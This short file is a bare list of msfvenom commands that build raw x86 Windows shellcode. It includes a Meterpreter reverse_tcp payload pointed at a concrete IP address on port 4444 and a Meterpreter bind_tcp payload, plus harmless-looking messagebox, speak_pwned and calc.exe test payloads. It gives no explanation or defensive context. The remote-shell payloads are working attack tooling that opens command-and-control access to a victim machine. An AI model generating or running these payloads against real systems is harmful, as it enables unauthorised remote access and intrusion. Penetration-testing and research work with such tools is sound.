msfvenom -p windows/messagebox ICON="WARNING" TEXT="Not A Valid Operating Environment!"  TITLE="Stop Running" -a x86 --platform win -f raw -o messagebox_x86.bin

msfvenom -p windows/meterpreter/reverse_tcp LHOST=152.136.226.65 LPORT=4444 -a x86 --platform win -f raw -o reverse_tcp_x86.bin

msfvenom -p windows/meterpreter/bind_tcp  LPORT=4444 -a x86 --platform win -f raw -o bind_tcp_x86.bin

msfvenom -p windows/speak_pwned -a x86 --platform win -f raw -o speak_pwned_x86.bin

msfvenom -p windows/exec CMD=calc.exe  -f raw -o calc_x86.bin